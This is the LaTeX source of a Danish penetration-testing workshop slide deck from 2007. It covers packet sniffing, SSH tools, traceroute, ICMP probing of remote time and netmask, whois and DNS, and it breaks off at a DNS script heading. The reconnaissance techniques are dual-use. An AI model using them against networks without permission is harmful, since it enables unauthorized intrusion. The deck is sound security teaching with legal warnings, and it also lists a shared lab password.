\documentclass[18pt,landscape,a4paper]{foils}

% HLK/ security6
\usepackage{sec6slides}

% nyheder:
% http://portswigger.net/proxy/download.html Burp proxy kan ændre
% requests
% husk 
% mindre tcpdump, mere "øvelse 1" "øvelse 2" osv.
% mine setups med John the ripper fra sylvester, evt kombineret med googlehacking?
% lidt cutenews?
% lidt mindre om dcom
% input fra Grey Hat Hacking bogen metasploit intro? kan måske 
% erstatte/udvide dcom som eksempel?


\begin{document}

\slide{}

\mytitlepage
{Hacker workshop}
{April 2007}

\vskip 1 cm
\centerline{This is open source!}

% HLK/PROSA
\prosadagsplan

\slide{Formålet med kurset}
\vskip 2 cm

%{\hlkbig En 3 dages workshop, hvor du lærer at angribe dit netværk!}

\begin{list1}
\item Skabe en grundig forståelse for hackerværktøjer
  samt penetrationstest metoder
\item Sætte deltagerne istand til at kunne gennemføre enkle til
  videregående analyser af netværksopkoblede systemer 
\item Ruste deltagerne til at kunne identificere sårbarheder og usikre
  konfigurationer i netværk
\item Design af netværk til minimering af risici.
\end{list1}


\slide{Hacker - cracker}

{\bfseries Det korte svar - drop diskussionen}

%Det lidt længere svar:\\
Det havde oprindeligt en anden betydning, men medierne har taget
udtrykket til sig - og idag har det begge betydninger. 

{\color{red}\hlkbig Idag er en hacker stadig en der bryder ind i systemer!}

ref. Spafford, Cheswick, Garfinkel, Stoll, ...
- alle kendte navne indenfor sikkerhed

Hvis man vil vide mere kan man starte med:
\begin{list2}
\item \emph{Cuckoo's Egg: Tracking a Spy Through the Maze of Computer
 Espionage},  Clifford Stoll  
\item \emph{Hackers: Heroes of the Computer Revolution},
Steven Levy
\item \emph{Practical Unix and Internet Security},
Simson Garfinkel, Gene Spafford, Alan Schwartz 
\end{list2}

\slide{Aftale om test af netværk}

{\bfseries Straffelovens paragraf 263 Stk. 2. Med bøde eller fængsel
  indtil 6 måneder 
straffes den, som uberettiget skaffer sig adgang til en andens
oplysninger eller programmer, der er bestemt til at bruges i et anlæg
til elektronisk databehandling.}

Hacking kan betyde:
\begin{list2}
\item At man skal betale erstatning til personer eller virksomheder
\item At man får konfiskeret sit udstyr af politiet
\item At man, hvis man er over 15 år og bliver dømt for hacking, kan
  få en bøde - eller fængselsstraf i alvorlige tilfælde 
\item At man, hvis man er over 15 år og bliver dømt for hacking, får
en plettet straffeattest. Det kan give problemer, hvis man skal finde
et job eller hvis man skal rejse til visse lande, fx USA og
Australien
\item Frit efter: \link{http://www.stophacking.dk} lavet af Det
  Kriminalpræventive Råd 
\item Frygten for terror har forstærket ovenstående - så lad være!
\end{list2}

\slide{Agenda: Planen for kurset}

\begin{list1}
%\item Indledning - præsentation
\item Sikkerhedsmæssige aspekter af TCP/IP:
\begin{list2}
\item Internet idag - aktuelle hændelser
\item Netværk OSI og Internetmodellerne
\item Hvad giver penetrationstest virksomheden
\end{list2}

\item Windows sikkerhed:
\begin{list2}
\item Distribuerede systemer og usikre protokoller 
\item Sårbarheder og CVE, udnyttelse af sårbarheder
\item hærdning af Windows systemer
\item sikkerhed i websystemer
\end{list2}

\item UNIX sikkerhed:
\begin{list2}
\item Udnyttelse af sikkerhedshuller
\item opbygning af infrastruktur til scanning
\item hærdning af UNIX systemer
\end{list2}
\end{list1}  


\slide{Praktiske øvelser}

\begin{list1}
\item Der er en lang række praktiske øvelser som vil give jer erfaring med
\begin{list2}
\item ICMP - lavniveau netværksanalyse
\item portscanning - porte TCP og UDP
\item exploits - hvad er proof of concept kode
\item Videregående programmer og scripts
\item netcat - scripting af netværksopgaver
\item Brug af stand alone værktøjer - bootable cd-rom'er til analyse on-site
\item Brug af MD5 kryptografisk hash funktion til integritetscheck
\item PGP til sikker kommunikation
\item Nessus - automatiseret afvikling af penetrationstest
\item Wireshark (tidl. Ethereal) - open source netværkssniffer til Windows og UNIX
\item SSH programmer, hvordan virker de, Secure Copy SCP,
  Putty og WinSCP på Windows
\end{list2}
\end{list1}

\slide{Forberedelse til at blive hacket}

\begin{list1}
\item Da I formentlig selv vil blive udsat for angreb og eventuelle 
kompromitterede servere gennemgås ligeledes:
\begin{list2}
\item Hvordan opdages en hændelse
\item Hvordan reagerer man på en hændelse
\item Forebyggelse - erfaringer  
\item integritetscheckere AIDE og tripwire
\item Bevissikring og dokumentation
\item En metode til incident response
\item Incident response plan
\item recovering from root compromise, håndtering af hackede systemer
\end{list2}
\end{list1}


% slides start
\slide{Forudsætninger}

\begin{list1}
\item Dette er en dybdegående workshop og fuldt udbytte kræver at
  deltagerne har mindst 2 års praktisk erfaring som teknikker og/eller
  systemadministrator
%\item Vi gennemgår mange forskellige ting - ofte i detaljer
\item Til penetrationstest og det meste Internet-sikkerhedsarbejde er der
 følgende forudsætninger
\begin{list2}
\item Netværkserfaring
\item TCP/IP principper - ofte i detaljer
\item Programmmeringserfaring er en fordel
\item UNIX kendskab er ofte en {\bfseries nødvendighed}\\
- fordi de nyeste værktøjer er skrevet til UNIX i form af Linux og BSD
\vskip 3 mm
\item Kurset anvender OpenBSD til øvelser og UNIX kendskab
  er derfor en fordel
\item Alle øvelser kan udføres fra en Windows PC - UNIX øvelserne
  foregår via login til UNIX maskinen
\end{list2}
\end{list1}

\slide{Kursusfaciliteter}

\begin{list1}
  \item der er lavet et netværk til test med følgende systemer:
    \begin{list2}
      \item UNIX server baseret på OpenBSD Fiona med HTTP server: diverse
      værktøjer, scripts, nmap 
\item et antal targets - Windows 2000, Linux m.fl.
    \end{list2}
\item På UNIX serveren tillades login diverse kursusbrugere - kursus1,
  kursus2, kursus3, ... kodeordet er {\bf kursus}
\item Der er DHCP server og IPv6 autoconfiguration - det er tilladt at
  tilslutte egen bærbar - på eget ansvar (hint: brug en firewall ;-)
\item \color{red} Det er IKKE tilladt at scanne udenfor det lokale
  netværk uden forudgående aftale 
- overtrædelse kan medføre bortvisning
\end{list1}

\slide{Kursusnetværk}

\hlkimage{22cm}{images/kursus-netvaerk.pdf}


\slide{UNIX starthjælp}
\begin{list1}
\item Da UNIX indgår er her et lille \emph{cheat sheet} til UNIX
\begin{list2}
\item DOS/Windows kommando - tilsvarende UNIX, og forklaring
\item dir - ls - står for list files, viser filnavne
\item del - rm - står for remove, sletter filer
%\item ren - mv - move flytter filer til nyt navn, rename
%\item md - mkdir - make directory, lav en mappe/katalog
\item cd - cd - change directory, skifter katalog
\item type - cat - concatenate, viser indholdet af tekstfiler 
\item more - less - viser tekstfiler en side af gangen
\item attrib - chmod - change mode, ændrer rettighederne på filer 
\end{list2}
\item Prøv bare:
  \begin{list2}
    \item {\bfseries ls} list, eller long listing med {\bfseries ls -l} 
    \item {\bfseries cat /etc/hosts} viser hosts filen 
\item {\bfseries chmod +x head.sh} - sæt execute bit på en fil så den
  kan udføres som et program med kommandoen \verb+./head.sh+
  \end{list2}
\end{list1}

\slide{Hackerværktøjer}
% måske til reference afsnit?

\begin{list1}
\item Der benyttes på kurset en del værktøjer:
\begin{list2}
\item nmap - \link{http://www.insecure.org} portscanner
\item Nessus - \link{http://www.nessus.org} automatiseret testværktøj
%\item libnet m.fl. - \link{http://www.packetfactory.net} - diverse projekter
%  relateret til pakker og IP netværk
%\item l0phtcrack - \link{http://www.atstake.com/research/lc/} - The Password
%  Auditing and Recovery Application
\item Wireshark - \link{http://http://www.wireshark.org/} avanceret netværkssniffer
%\item F.I.R.E -  \link{http://biatchux.dmzs.com/} - en cd-rom der indeholder en 
%  bootable Linux del.
\item OpenBSD - \link{http://www.openbsd.org} operativsystem med fokus
  på sikkerhed 
%\item \link{http://www.isecom.org/} - Open Source Security Testing
%  Methodology Manual - gennemgang af elementer der bør indgå i en struktureret test 
\item Putty - 
\link{http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html}
terminal emulator med indbygget SSH
\end{list2}
\item {\color{red} \bfseries 
NB: Der kan forekomme opsamling af hemmeligheder fra computere på
netværket! Hvis I benytter protokoller der sender kodeord i klar tekst
kan disse opsnappes med sniffere.
}
\end{list1}

% 
%page
\slide{Hvad skal der ske?}

\begin{list1}
\item Tænk som en hacker
\item Rekognoscering
\begin{list2}
\item ping sweep, port scan
\item OS detection - TCP/IP eller banner grab
\item Servicescan - rpcinfo, netbios, ...
\item telnet/netcat interaktion med services
\end{list2}
\item Udnyttelse/afprøvning: Nessus, nikto, exploit programs
\item Oprydning vises ikke på kurset, men I bør i praksis:
\begin{list2}
\item Lav en rapport
\item Gennemgå rapporten, registrer ændringer
\item Opdater programmer, konfigurationer, arkitektur, osv. 
\end{list2}
\item I skal jo også VISE andre at I gør noget ved sikkerheden.
\end{list1}


%\slide{Hackere}

% Her skal KSA præsentation ind

% session 1-2 netværk start her


% xxx \slide{RFC, Internet, åbne standarder}

% input fra tidligere præsentationer 5-10 slides

\slide{Internet idag}

\hlkimage{14cm}{images/server-client.pdf}

\begin{list1}
\item Klienter og servere
\item Rødder i akademiske miljøer
\item Protokoller der er op til 20 år gamle
\item Meget lidt kryptering, mest på http til brug ved e-handel 
\end{list1}

\slide{Internet er åbne standarder!}

{\hlkbig 
We reject kings, presidents, and voting.\\
We believe in rough consensus and running code.\\
-- The IETF credo Dave Clark, 1992.}

\begin{list1}
\item Request for comments - RFC - er en serie af dokumenter
\item RFC, BCP, FYI, informational\\
de første stammer tilbage fra 1969
\item Ændres ikke, men får status Obsoleted når der udkommer en nyere
  version af en standard
\item Standards track:\\
Proposed Standard $\rightarrow$ Draft Standard $\rightarrow$ Standard
\item  Åbne standarder = åbenhed, ikke garanti for sikkerhed
\end{list1}

\slide{The Internet Worm 2. nov 1988}

\begin{list1}
\item Udnyttede følgende sårbarheder
\begin{list2}
\item buffer overflow i fingerd - VAX kode
\item  Sendmail - DEBUG
\item Tillid mellem systemer: rsh, rexec, ...
\item dårlige passwords
\end{list2}
\item Avanceret + camouflage!
\begin{list2}
\item Programnavnet sat til 'sh'
\item Brugte fork() til at skifte PID jævnligt
\item password cracking med intern liste med 432 ord og /usr/dict/words
\item Fandt systemer i /etc/hosts.equiv, .rhosts, .forward, netstat ...
\end{list2}
\item Lavet af Robert T. Morris, Jr. 
\item Medførte dannelsen af CERT, \link{http://www.cert.org}
\end{list1}

\slide{CERT/CC - www.cert.org}

\hlkimage{10cm}{images/CERT-org.png}

\begin{list1}
\item Stiftet som reaktion på The Internet Worm i 1988  
\item betragtet som de seriøse - og konservative
\item informerer om sårbarheder og trusler
\item koordinerer aktiviteter - mellem leverandører
\item opsamler statistik for hacker aktivitet
\end{list1}

\slide{OSI og Internet modellerne}

\hlkimage{14cm,angle=90}{images/compare-osi-ip.pdf}


\slide{TCPDUMP - protokolanalyse pakkesniffer}

\hlkimage{14cm}{images/tcpdump-manual.pdf}


\centerline{\link{http://www.tcpdump.org}
- både til Windows og UNIX}
\slide{tcpdump - normal brug}

\begin{list2}
  \item tekstmode
\item kan gemme netværkspakker i filer
\item kan læse netværkspakker fra filer
\item er de-facto standarden for at gemme netværksdata i filer
\end{list2}

\begin{alltt}
\tiny [root@otto hlk]# tcpdump -i en0
tcpdump: listening on en0
13:29:39.947037 fe80::210:a7ff:fe0b:8a5c > ff02::1: icmp6: router advertisement
13:29:40.442920 10.0.0.200.49165 > dns1.cybercity.dk.domain:  1189+[|domain]
13:29:40.487150 dns1.cybercity.dk.domain > 10.0.0.200.49165:  1189 NXDomain*[|domain]
13:29:40.514494 10.0.0.200.49165 > dns1.cybercity.dk.domain:  24765+[|domain]
13:29:40.563788 dns1.cybercity.dk.domain > 10.0.0.200.49165:  24765 NXDomain*[|domain]
13:29:40.602892 10.0.0.200.49165 > dns1.cybercity.dk.domain:  36485+[|domain]
13:29:40.648288 dns1.cybercity.dk.domain > 10.0.0.200.49165:  36485 NXDomain*[|domain]
13:29:40.650596 10.0.0.200.49165 > dns1.cybercity.dk.domain:  4101+[|domain]
13:29:40.694868 dns1.cybercity.dk.domain > 10.0.0.200.49165:  4101 NXDomain*[|domain]
13:29:40.805160 10.0.0.200 > mail: icmp: echo request
13:29:40.805670 mail > 10.0.0.200: icmp: echo reply
...
\end{alltt}

\slide{TCPDUMP syntaks - udtryk}

\begin{list1}
\item filtre til husbehov
  \begin{list2}
\item type - host, net og port
\item src pakker med afsender IP eller afsender port
\item dst pakker med modtager IP eller modtager port
\item host - afsender eller modtager 
\item proto - protokol: ether, fddi, tr, ip, ip6, arp,  rarp,  decnet,
tcp og udp
\end{list2}
\item IP adresser kan angives som dotted-decimal eller navne
\item porte kan angives med numre eller navne
\item komplekse udtryk opbygges med logisk and,  or,  not
\end{list1}

\slide{tcpdump udtryk eksempler}

\begin{list1}
  \item Host 10.1.2.3\\
Alle pakker hvor afsender eller modtager er 10.1.2.3
\item host 10.2.3.4 and not host 10.3.4.5\\
Alle pakker til/fra 10.2.3.4 undtagen dem til/fra 10.3.4.5\\
- meget praktisk hvis man er logget ind på 10.2.3.4 via netværk fra 10.3.4.5
\item host foo and not port ftp  and not  port  ftp-data\\
trafik til/fra maskine \emph{foo} undtagen hvis det er FTP trafik
\end{list1}

\slide{Wireshark - grafisk pakkesniffer}

\hlkimage{20cm}{images/wireshark-website.png} 

\centerline{\link{http://www.wireshark.org}}
\centerline{både til Windows og UNIX, tidligere kendt som Ethereal}

\slide{Programhygiejne!}

\begin{list1}
  \item {\color{red}Download, installer - kør!} - farligt!
\item Sådan gøres det:
  \begin{list2}
    \item download program OG signaturfil/MD5
\item verificer signatur eller MD5
\item installer
\item brug programmet
\item hold programmet opdateret!\\
Se eksempelvis teksten på hjemmesiden:\\
\emph{Wireshark 0.99.2 has been released. Several security-related vulnerabilities have been fixed and several new features have been added.}
  \end{list2}
\item NB: ikke alle programmer har signaturer :(
\item MD5 er en envejs hash algoritme - mere om det senere
\end{list1}


\slide{Brug af Wireshark}

\hlkimage{13cm}{images/ethereal-capture-options.png}

\centerline{Man starter med Capture - Options}

\slide{Brug af Wireshark}

\hlkimage{24cm}{images/ethereal-main-window.png}

\centerline{Læg mærke til filtermulighederne}




\slide{Secure Shell - SSH og SCP}

\begin{center}
\colorbox{white}{\includegraphics[width=12cm]{images/tshirt-9b.jpg}}  
\end{center}
\begin{list1}
\item SSH afløser en række protokoller som er usikre:
  \begin{list2}
  \item Telnet til terminal adgang
  \item r* programmerne, rsh, rcp, rlogin, ...
  \item FTP med brugerid/password
  \end{list2}
\end{list1}


\slide{SSH - de nye kommandoer er}
\begin{list1}
\item kommandoerne er:
\begin{list2}
  \item ssh - Secure Shell
  \item scp - Secure Copy
  \item sftp - secure FTP 
  \end{list2}
\item Husk: SSH er både navnet på protokollerne - version 1 og 2 samt
  programmet \verb+ssh+ til at logge ind på andre systemer
\item SSH tillader også port-forward, tunnel til usikre protokoller,
  eksempelvis X protokollen til UNIX grafiske vinduer
\item {\bfseries NB: Man bør idag bruge SSH protokol version 2!}
\end{list1}


\slide{Putty en SSH til Windows}

\begin{center}
\colorbox{white}{\includegraphics[width=13cm]{images/putty-1.jpg}}  

Login skærmen til Putty terminal programmet
\end{center}

\slide{Putty terminaladgang}

\begin{center}
\colorbox{white}{\includegraphics[width=20cm]{images/putty-screen2.jpg}}  

Billede fra \link{http://edu.muhos.fi/opas/ssh/putty-ohje.htm}
\end{center}

\slide{Grafisk Secure Copy - WinSCP}

\begin{center}
\colorbox{white}{\includegraphics[width=16cm]{images/winscp-login-advanced.png}}  
\end{center}

\begin{center}
\item screenshot fra \link{http://winscp.vse.cz/eng/screenshots/large/advanced.gif}
\end{center}

\slide{Grafisk Secure Copy - WinSCP}

\begin{center}
\colorbox{white}{\includegraphics[width=12cm]{images/winscp-explorer.png}}  
\end{center}

\begin{center}
\item screenshot fra
  \link{http://winscp.vse.cz/eng/screenshots/large/explorer.gif} 
\end{center}


% opgaver session 1-2
\slide{Opgave: Wireshark installation}

{\bfseries Opgave:}\\
Installer Wireshark lokalt på Windows maskinen

{\bfseries Forslag til fremgangsmåde:}\\ 
hent Wireshark programmet fra webserveren eller \link{http://www.wireshark.org}\\
WinPcap kan hentes alene fra \link{http://winpcap.polito.it}\\
NB: idag indeholder Wireshark installprogrammet til WinPcap

{\bfseries Hjælp:}\\ 
PCAP er et packet capture bibliotek som er nødvendigt for at lytte i
promiscious mode

{\bfseries Diskussion:}\\ 
Wireshark er blot et af mange programmer til analyse af netværkstrafik

\slide{Opgave: opsamling af trafik}

{\bfseries Opgave:}\\ 
Lær at kigge på netværkstrafik - opsnap ICMP echo pakker, fra ping
programmet 

{\bfseries Forslag til fremgangsmåde:}\\ 
start pakkesniffer\\
brug menuen Capture - Start, sæt evt. filter på her og start så ping
af default gateway. Undersøg derefter pakkerne 

{\bfseries Hjælp:}\\
De forskellige vinduer indeholder
oversigt over pakkerne, pakken der er valgt - hvor der kan peges på
header information, dekodes pakkerne

Den nederste del indeholder pakkens data i råt format hexadecimalt og
som ascii tekst

{\bfseries Diskussion:} 

\slide{Opgave: Putty installation}


{\bfseries Opgave:}\\ 
Installer Putty lokalt på Windows maskinen

{\bfseries Forslag til fremgangsmåde:}\\
hent programmet fra webserveren eller\\
\link{http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html}

  
installer programmet som beskrevet

{\bfseries Hjælp:}\\ 
Putty er en terminal emulator og erstatter telnet programmet i
Windows. Det er ofte den foretrukne brugergrænseflade for UNIX brugere
og hackere

{\bfseries Diskussion:}\\ 

\slide{Opgave: SSH login - Putty}
\label{ex:SSHD-login}

{\bfseries Opgave:} \\
Log ind på UNIX serveren ved brug af Putty

{\bfseries Forslag til fremgangsmåde:}\\ 
Hent Putty installer fra webserveren, installer denne og login på UNIX serveren
med dit brugernavn kursus? og kodeordet {\bf kursus}

{\bfseries Hjælp:}\\ 
Husk at putty skal have at vide at det er SSH protokollen og ikke
Telnet

{\bfseries Diskussion:}\\ 
SSH protokollen tillader både login og filoverførsel. SSH er de facto
standarden for sikker terminaladgang. NB: Man bør bruge SSH protokol
version 2! 

WinSCP er et godt windows værktøj til at kopiere filer frem og tilbage
med via Secure Copy (indbygget i SSH protokollen)

\slide{Opgave: WinSCP installation}

{\bfseries Opgave:}\\
Installer WinSCP lokalt på Windows maskinen

{\bfseries Forslag til fremgangsmåde:}\\ 
hent winscp fra webserveren eller fra\\
\link{http://winscp.net/eng/index.php}

installer programmet som beskrevet

{\bfseries Hjælp:}\\
WinSCP kan være en stor hjælp når I skal arbejde med filer på UNIX
systemet - I kan ofte slippe for UNIX editorerne VI og EMACS

{\bfseries Diskussion:}\\ 
Kan WinSCP bruges generelt til opdatering af websites? hvad kræver
det? kan brugerne finde ud af det?

% session 1-3

\slide{SSH nøgler}

I praksis benytter man - bør man benytte nøgler fremfor kodeord
\begin{list1}
\item I kan lave jeres egne SSH nøgler med programmerne i Putty
\item Hvilken del skal jeg have for at kunne give jer adgang til en
  server?
\item Hvordan får jeg smartest denne nøgle?
\end{list1}

\slide{Installation af SSH nøgle}
\begin{list1}
\item Vi bruger login med password på kurset, men for
  fuldstændighedens skyld beskrives her hvordan nøgle installeres:

\begin{list2}
\item først skal der genereres et nøglepar {\bfseries id\_dsa og id\_dsa.pub}
\item Den offentlige del, filen id\_dsa.pub, kopieres til serveren
\item Der logges ind på serveren 
\item Der udføres udfør følgende kommandoer:
\begin{alltt}
cd \emph{skift til dit hjemmekatalog}
mkdir .ssh \emph{lav et katalog til ssh-nøgler}
cat id\_dsa.pub >> .ssh/authorized\_keys \emph{kopierer nøglen}
chmod -R go-rwx .ssh \emph{skift rettigheder på nøglen}
\end{alltt}
\end{list2}
\end{list1}

\slide{traceroute}

\begin{list1}
  \item traceroute programmet virker ved hjælp af TTL
\item levetiden for en pakke tælles ned i hver router på vejen og ved at sætte denne lavt
  opnår man at pakken \emph{timer ud} - besked fra hver router på vejen
\item default er UDP pakker, men på UNIX systemer er der ofte mulighed
  for at bruge ICMP
\end{list1}

\begin{alltt}
{\bfseries  traceroute 217.157.20.129}
traceroute to 217.157.20.129 (217.157.20.129)\\
, 30 hops max, 40 byte packets
 1  safri (10.0.0.11)  3.577 ms  0.565 ms  0.323 ms
 2  router (217.157.20.129)  1.481 ms  1.374 ms  1.261 ms
\end{alltt}


\slide{traceroute - med UDP}

\begin{alltt}
\small # {\bfseries tcpdump -i en0 host 217.157.20.129 or host 10.0.0.11}
tcpdump: listening on en0
23:23:30.426342 10.0.0.200.33849 > router.33435: udp 12 [ttl 1]
23:23:30.426742 safri > 10.0.0.200: icmp: time exceeded in-transit
23:23:30.436069 10.0.0.200.33849 > router.33436: udp 12 [ttl 1]
23:23:30.436357 safri > 10.0.0.200: icmp: time exceeded in-transit
23:23:30.437117 10.0.0.200.33849 > router.33437: udp 12 [ttl 1]
23:23:30.437383 safri > 10.0.0.200: icmp: time exceeded in-transit
23:23:30.437574 10.0.0.200.33849 > router.33438: udp 12
23:23:30.438946 router > 10.0.0.200: icmp: router udp port 33438 unreachable
23:23:30.451319 10.0.0.200.33849 > router.33439: udp 12
23:23:30.452569 router > 10.0.0.200: icmp: router udp port 33439 unreachable
23:23:30.452813 10.0.0.200.33849 > router.33440: udp 12
23:23:30.454023 router > 10.0.0.200: icmp: router udp port 33440 unreachable
23:23:31.379102 10.0.0.200.49214 > safri.domain:  6646+ PTR? \\
200.0.0.10.in-addr.arpa. (41)
23:23:31.380410 safri.domain > 10.0.0.200.49214:  6646 NXDomain* 0/1/0 (93)
14 packets received by filter
0 packets dropped by kernel
\end{alltt}

\slide{Værdien af traceroute}

\begin{list1}
\item diagnosticering af netværksproblemer - formålet med traceroute
\item indblik i netværkets opbygning!
\item svar fra hosts - en modtaget pakke fremfor et \emph{sort hul}

\item traceroute er ikke et angreb - det er også vigtigt at kunne
  genkende normal trafik!
\end{list1}

\slide{Network mapping}

\hlkimage{23cm}{images/network-example.pdf}

\begin{list1}
\item Ved brug af traceroute og tilsvarende programmer kan man ofte
  udlede topologien i det netværk man undersøger  
\end{list1}


\slide{Andre trace programmer}

\begin{list1}
  \item Der findes mange specialiserede trace programmer til diverse
  formål
\item Eksempel: dnstracer information om DNS servere
\end{list1}

\begin{alltt}
# dnstracer -r . www.security6.net
Strange amount of retries, setting to default
Tracing to www.security6.net via 10.0.0.11, timeout 15 seconds
10.0.0.11 (10.0.0.11) 
 |\___ H.GTLD-SERVERS.net [net] (192.54.112.30) 
 |     |\___ NS6.GANDI.net [security6.net] (80.67.173.196) * * * 
 |      \___ NS1.security6.net [security6.net] (217.157.20.130) 
 |           |\___ B.GTLD-SERVERS.net [net] (192.33.14.30) 
 |           |     |\___ NS6.GANDI.net [security6.net] ...
\end{alltt}

\slide{Flere traceprogrammer}

\begin{list1}

\item mtr My traceroute - grafisk \link{http://www.bitwizard.nl/mtr/}
\item lft - \emph{layer four trace} benytter TCP SYN og FIN prober
\item trace ved hjælp af TCP og andre protokoller findes
\item paratrace - \emph{Parasitic Traceroute via Established TCP Flows
    and IPID Hopcount} 
\item Der findes webservices hvor man kan trace fra, eksempelvis: \link{http://www.samspade.org}
\end{list1}

\slide{What time is it?}

\hlkimage{8cm}{images/xclock.pdf}

\begin{center}
\hlkbig Hvad er klokken?

\vskip 1 cm
Hvad betydning har det for sikkerheden?

Brug NTP Network Time Protocol på produktionssystemer
\end{center}

\slide{What time is it? - spørg ICMP}

\vskip 1 cm

\begin{list1}
  \item ICMP timestamp option - request/reply
\item hvad er klokken på en server
\item Slayer icmpush - er installeret på server
\item viser tidstempel
\end{list1}

\begin{alltt}
# {\bfseries icmpush -v -tstamp 10.0.0.12}
ICMP Timestamp Request packet sent to 10.0.0.12 (10.0.0.12)

Receiving ICMP replies ...
fischer         -> 21:27:17
icmpush: Program finished OK
\end{alltt}

\slide{Netmasken? - spørg ICMP}

\vskip 1 cm

\begin{list1}
  \item ICMP address mask option - request/reply
\item hvilken netmaske bruger serveren
\item Slayer icmpush - er installeret på server
\item viser netmasken
\end{list1}

\begin{alltt}
# {\bfseries icmpush -v -mask 217.157.20.129}
ICMP Address Mask Request packet sent to 217.157.20.129

Receiving ICMP replies ...
router.kramse.dk -> 255.255.255.240
icmpush: Program finished OK
\end{alltt}



\slide{Opgave: brug traceroute}

{\bfseries Opgave:} 
Brug traceroute 

{\bfseries Forslag til fremgangsmåde:} 
Lav en traceroute fra Windows systemet til enten maskiner på
lokalnettet eller ud i verden husk at traceroute hedder {\bfseries
  tracert} på windows

{\bfseries Hjælp:}\\ 
Hvad er forskellen på\\
{\bfseries traceroute www.dr.dk} og\\
{\bfseries traceroute www.tv2.dk}

Hvad er forskellen på (skal udføres på OpenBSD/UNIX)
\begin{list2}
\item {\bfseries traceroute} og {\bfseries traceroute -I} 
\item NB: traceroute med -I findes kun på UNIX - traceroute med ICMP pakker
\item Der er mange der ikke blokerer for ICMP traceroute
\end{list2}

\slide{Opgave: ping og traceroute}
\label{ex:ping}

{\bfseries Opgave:}\\ 
Lær at bruge ping og traceroute programmerne

{\bfseries Forslag til fremgangsmåde:} \\
Brug ping og traceroute til at teste netværksforbindelsen - kan
udføres fra både windows og UNIX

Er der forbindelse til alle servere på oversigtstegningen?

{\bfseries Hjælp:} \\
ICMP er Internet Control Message Protocol det bruges typisk til at
rapportere om fejl, host unreachable og lignende.

Ping programmet benytter ICMP ECHO request og forventer ICMP ECHO
reply. Traceroute programmet sender ICMP eller UDP og forventer ICMP
svar tilbage for at kunne mappe et netværk.



\slide{Opgave: icmpush - ICMP tool}
\label{ex:icmpush}

{\bfseries Opgave:} \\
Lær at bruge icmpush programmet

{\bfseries Forslag til fremgangsmåde:} \\
Login på UNIX server - læs manualen til programmet

{\bfseries Hjælp:} \\
ICMP er Internet Control Message Protocol det bruges typisk til at
rapportere om fejl, host unreachable og lignende.

Ping programmet benytter ICMP ECHO request og forventer ICMP ECHO
reply. Traceroute programmet sender ICMP eller UDP og forventer ICMP
svar tilbage for at kunne mappe et netværk.

{\bfseries Diskussion:}\\ 
I skal lære at spørge efter mindst echo, time og netmask med icmpush

% session 1-4

\slide{Informationsindsamling}

\begin{list1}
\item Det vi har udført er informationsindsamling
\item Indsamlingen kan være aktiv eller passiv indsamling i forhold
  til målet for angrebet
\item passiv kunne være at lytte med på trafik eller søge i databaser
  på Internet
\item aktiv indsamling er eksempelvis at sende ICMP pakker og
  registrere hvad man får af svar
\end{list1}


\slide{whois systemet}

\begin{list1}
\item IP adresserne administreres i dagligdagen af et antal Internet
  registries, hvor de største er:
\begin{list2}
\item RIPE (Réseaux IP Européens)  \link{http://ripe.net}
\item ARIN American Registry for Internet Numbers \link{http://www.arin.net}
\item Asia Pacific Network Information Center \link{http://www.apnic.net}
\item LACNIC (Regional Latin-American and Caribbean IP Address
  Registry) - Latin America and some Caribbean Islands
  \link{http://www.lacnic.net} 
\item AfriNIC African Internet Numbers Registry \link{http://www.afrinic.net}
\end{list2}
\item disse fem kaldes for Regional Internet Registries (RIRs) i
  modsætning til Local Internet Registries (LIRs) og National Internet
  Registry (NIR) 
\end{list1}

\slide{whois systemet -2}

\begin{list1}
\item ansvaret for Internet IP adresser ligger hos ICANN The Internet
  Corporation for Assigned Names and Numbers
\link{http://www.icann.org}
\item NB: ICANN må ikke forveksles med IANA Internet Assigned Numbers
  Authority\\ \link{http://www.iana.org/} som bestyrer portnumre og
  andre magiske konstanter m.v.
\end{list1}


%\slide{top leveldomæner og DNS}


\slide{DNS systemet}
 
\begin{list1}
\item navneopslag på Internet  
\item tidligere brugte man en {\bfseries hosts} fil\\
  hosts filer bruges stadig lokalt til serveren - IP-adresser
\item UNIX: /etc/hosts
\item Windows \verb+c:\windows\system32\drivers\etc\hosts+
\item Eksempel: www.security6.net har adressen 217.157.20.131
\item skrives i database filer, zone filer
\end{list1}
\begin{alltt}
  ns1     IN      A       217.157.20.130
  IN      AAAA    2001:618:433::1
  www     IN      A       217.157.20.131
  IN      AAAA    2001:618:433::14
\end{alltt}

\slide{Mere end navneopslag}

\begin{list1}
\item består af resource records med en type:
  \begin{list2}
  \item adresser A-records
  \item IPv6 adresser AAAA-records
  \item autoritative navneservere NS-records
  \item post, mail-exchanger MX-records
  \item flere andre: md ,  mf ,  cname ,  soa ,
    mb , mg ,  mr ,  null ,  wks ,  ptr ,
    hinfo ,  minfo ,  mx ....
  \end{list2}
\end{list1}
\begin{alltt}
  IN      MX      10      mail.security6.net.
  IN      MX      20      mail2.security6.net.
\end{alltt}

\slide{DNS root servere}
\begin{list1}
\item Root-servere - 13 stk geografisk distribueret fordelt på Internet
\end{list1}

\begin{alltt}
  I.ROOT-SERVERS.NET.     3600000 A       192.36.148.17
  E.ROOT-SERVERS.NET.     3600000 A       192.203.230.10
  D.ROOT-SERVERS.NET.     3600000 A       128.8.10.90
  A.ROOT-SERVERS.NET.     3600000 A       198.41.0.4
  H.ROOT-SERVERS.NET.     3600000 A       128.63.2.53
  C.ROOT-SERVERS.NET.     3600000 A       192.33.4.12
  G.ROOT-SERVERS.NET.     3600000 A       192.112.36.4
  F.ROOT-SERVERS.NET.     3600000 A       192.5.5.241
  B.ROOT-SERVERS.NET.     3600000 A       128.9.0.107
  J.ROOT-SERVERS.NET.     3600000 A       198.41.0.10
  K.ROOT-SERVERS.NET.     3600000 A       193.0.14.129
  L.ROOT-SERVERS.NET.     3600000 A       198.32.64.12
  M.ROOT-SERVERS.NET.     3600000 A       202.12.27.33  
\end{alltt}

\slide{DK-hostmaster}

\begin{list1}
\item bestyrer .dk TLD - top level domain
  
\item man registrerer ikke .dk-domæner hos DK-hostmaster, men hos en
  registrator 
\item Et domæne bør have flere navneservere og flere postservere
\item autoritativ navneserver - ved autoritativt om IP-adresse for
  maskine.domæne.dk findes 
\item ikke-autoritativ - har på vegne af en klient slået en adresse op
\item Det anbefales at overveje en service som
  \link{http://www.gratisdns.dk} der har 5 navneservere distribueret
  over stor geografisk afstand - en udenfor Danmark
\end{list1}

\slide{Små DNS tools bind-version - Shell script}

\begin{alltt}\small
